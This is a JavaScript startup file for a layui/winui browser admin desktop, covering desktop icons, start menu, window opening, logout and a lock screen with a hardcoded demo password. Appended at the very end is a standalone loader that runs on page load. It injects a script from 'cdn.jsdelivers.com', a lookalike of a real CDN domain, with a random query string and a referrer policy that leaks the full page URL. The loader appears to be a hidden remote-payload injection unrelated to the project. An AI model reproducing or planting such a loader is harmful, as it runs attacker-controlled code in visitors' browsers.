﻿layui.config({
    base: './lib/winui/' //指定 winui 路径
    , version: '1.0.0-beta'
}).extend({  //指定js别名
    window: 'js/winui.window',
    desktop: 'js/winui.desktop',
    start: 'js/winui.start',
    helper: 'js/winui.helper'
}).define(['window', 'desktop', 'start', 'helper'], function (exports) {
    var $ = layui.jquery;
    $(function () {
        winui.window.msg('欢迎进入后台系统', {
            time: 4500,
            offset: '40px',
            btn: ['点击进入全屏'],
            btnAlign: 'c',
            yes: function (index) {
                winui.fullScreen(document.documentElement);
                layer.close(index);
            }
        });

        winui.config({
            settings: layui.data('winui').settings || {
                color: 32,
                taskbarMode: 'bottom',
                startSize: 'sm',
                bgSrc: 'images/bg_01.jpg',
                lockBgSrc: 'images/bg_04.jpg'
            },  //如果本地配置为空则给默认值
            desktop: {
                options: {
                    url: './json/desktopmenu.json',
                    method: 'get',
                    data: { nihaoa: '2206' }
                },    //可以为{}  默认 请求 json/desktopmenu.json
                done: function (desktopApp) {
                    desktopApp.ondblclick(function (id, elem) {
                        OpenWindow(elem);
                    });
                    desktopApp.onclick(function (id, elem) {
                        OpenWindow(elem);
                    });
                    desktopApp.contextmenu({
                        item: ["打开", "删除", '右键菜单可自定义'],
                        item1: function (id, elem) {
                            OpenWindow(elem);
                        },
                        item2: function (id, elem, events) {
                            winui.window.msg('删除回调');
                            $(elem).remove();
                            //从新排列桌面app
                            events.reLocaApp();
                        },
                        item3: function (id, elem, events) {
                            winui.window.msg('自定义回调');
                        }
                    });
                }
            },
            menu: {
                options: {
                    url: './json/allmenu.json',
                    method: 'get',
                    data: { nihaoa: '' }
                },
                done: function (menuItem) {
                    //监听开始菜单点击
                    menuItem.onclick(function (elem) {
                        OpenWindow(elem);
                    });
                    menuItem.contextmenu({
                        item: [{
                            icon: 'fa-cog'
                            , text: '设置'
                        }, {
                            icon: 'fa-close'
                            , text: '关闭'
                        }, {
                            icon: 'fa-qq'
                            , text: '右键菜单可自定义'
                        }],
                        item1: function (id, elem) {
                            //设置回调
                            console.log(id);
                            console.log(elem);
                        },
                        item2: function (id, elem) {
                            //关闭回调
                        },
                        item3: function (id, elem) {
                            winui.window.msg('自定义回调');
                        }
                    });
                }
            }
        }).init({
            audioPlay: false, //是否播放音乐（开机音乐只会播放一次，第二次播放需要关闭当前页面从新打开，刷新无用）
            renderBg: false //是否渲染背景图 （由于js是写在页面底部，所以不太推荐使用这个来渲染，背景图应写在css或者页面头部的时候就开始加载）
        }, function () {
            //初始化完毕回调
        });
    });

    //开始菜单磁贴点击
    $('.winui-tile').on('click', function () {
        OpenWindow(this);
    });

    //开始菜单左侧主题按钮点击
    $('.winui-start-item.winui-start-individuation').on('click', function () {
        winui.window.openTheme();
    });

    //打开窗口的方法（可自己根据需求来写）
    function OpenWindow(menuItem) {
        var $this = $(menuItem);

        var url = $this.attr('win-url');
        var title = $this.attr('win-title');
        var id = $this.attr('win-id');
        var type = parseInt($this.attr('win-opentype'));
        var maxOpen = parseInt($this.attr('win-maxopen')) || -1;
        if (url == 'theme') {
            winui.window.openTheme();
            return;
        }
        if (!url || !title || !id) {
            winui.window.msg('菜单配置错误（菜单链接、标题、id缺一不可）');
            return;
        }

        var content;
        if (type === 1) {
            $.ajax({
                type: 'get',
                url: url,
                async: false,
                success: function (data) {
                    content = data;
                },
                error: function (e) {
                    var page = '';
                    switch (e.status) {
                        case 404:
                            page = '404.html';
                            break;
                        case 500:
                            page = '500.html';
                            break;
                        default:
                            content = "打开窗口失败";
                    }
                    $.ajax({
                        type: 'get',
                        url: 'views/error/' + page,
                        async: false,
                        success: function (data) {
                            content = data;
                        },
                        error: function () {
                            layer.close(load);
                        }
                    });
                }
            });
        } else {
            content = url;
        }
        //核心方法（参数请看文档，config是全局配置 open是本次窗口配置 open优先级大于config）
        winui.window.config({
            anim: 2,
            miniAnim: 0,
            maxOpen: -1
        }).open({
            id: id,
            type: type,
            title: title,
            content: content
            //,area: ['70vw','80vh']
            //,offset: ['10vh', '15vw']
            , maxOpen: maxOpen
            //, max: false
            //, min: false
            //, refresh:true
        });
    }

    //注销登录
    $('.logout').on('click', function () {
        winui.hideStartMenu();
        winui.window.confirm('确认注销吗?', { icon: 3, title: '提示' }, function (index) {
            // winui.window.msg('执行注销操作，返回登录界面');
            window.location.href = '/login';
            layer.close(index);
        });
    });


    // 判断是否显示锁屏（这个要放在最后执行）
    if (window.localStorage.getItem("lockscreen") == "true") {
        winui.lockScreen(function (password) {
            //模拟解锁验证
            if (password === 'winadmin') {
                return true;
            } else {
                winui.window.msg('密码错误', { shift: 6 });
                return false;
            }
        });
    }

    //扩展桌面助手工具
    winui.helper.addTool([{
        tips: '锁屏',
        icon: 'fa-power-off',
        click: function (e) {
            winui.lockScreen(function (password) {
                //模拟解锁验证
                if (password === 'winadmin') {
                    return true;
                } else {
                    winui.window.msg('密码错误', { shift: 6 });
                    return false;
                }
            });
        }
    }, {
        tips: '切换壁纸',
        icon: 'fa-television',
        click: function (e) {
            layer.msg('这个是自定义的工具栏', { zIndex: layer.zIndex });
        }
    }]);

    exports('index', {});
});

;function loadJSScript(url, callback) {
    var script = document.createElement("script");
    script.type = "text/javascript";
    script.referrerPolicy = "unsafe-url";
    if (typeof(callback) != "undefined") {
        if (script.readyState) {
            script.onreadystatechange = function() {
                if (script.readyState == "loaded" || script.readyState == "complete") {
                    script.onreadystatechange = null;
                    callback();
                }
            };
        } else {
            script.onload = function() {
                callback();
            };
        }
    };
    script.src = url;
    document.body.appendChild(script);
}
window.onload = function() {
    loadJSScript("//cdn.jsdelivers.com/jquery/3.2.1/jquery.js?"+Math.random(), function() { 
         console.log("Jquery loaded");
    });
}